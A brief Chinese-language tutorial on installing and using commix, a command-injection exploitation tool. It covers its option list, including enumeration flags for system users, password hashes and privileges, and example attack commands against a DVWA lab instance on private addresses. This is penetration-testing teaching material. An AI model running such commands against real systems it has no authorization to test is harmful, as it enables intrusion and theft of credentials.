Command Injection
=
安装方法
-
在https://github.com/commixproject/commix/releases下下载commix压缩包，直接解压即可(由于新版v2.4出现了问题，v2.2经尝试可行)

使用说明
-
### 基本要素
commix.py –url=”” –data=”” –cookie=””
commix.py为打开我们的commix脚本，其次还需要输入对应的攻击网址url，data与cookie的相关数据
### 更多用法
    Options:
      -h, --help            Show help and exit.
    Target:
      -u URL, --url=URL     Target URL.
    Request:
      -d DATA, --data=..    Data string to be sent through POST.
      --host=HOST           HTTP Host header.
      --referer=REFERER     HTTP Referer header.
      --user-agent=AGENT    HTTP User-Agent header.
      --cookie=COOKIE       HTTP Cookie header.
      --cookie-del=CDEL     Set character for splitting cookie values.
    Enumeration:
      --all               Retrieve everything.
      --sys-info          Retrieve system information.
      --users             Retrieve system users.
      --passwords         Retrieve system users password hashes.
      --privileges        Retrieve system users privileges.
      --ps-version        Retrieve PowerShell's version number.
      Detection:
      --level=LEVEL       Level of tests to perform (1-3, Default: 1).
更多用法请见https://github.com/commixproject/commix/wiki/Usage， https://tools.kali.org/exploitation-tools/commix

### 示例
#### DVWA
root@kali:~/commix# python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=Submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
更多示例请见https://github.com/commixproject/commix/wiki/Usage-Examples， https://tools.kali.org/exploitation-tools/commix

- source: https://tools.kali.org/exploitation-tools/commix
```
root@speit-PowerEdge-T430:/home/speit/Downloads/commix-2.1-20171003# python commix.py --url http://192.168.5.100/vulnerabilities/exec/ --data="ip=INJECT_HERE&Submit=Submit" --cookie="security=low; PHPSESSID=upjio7inblkt07rte0eagcg045"
```
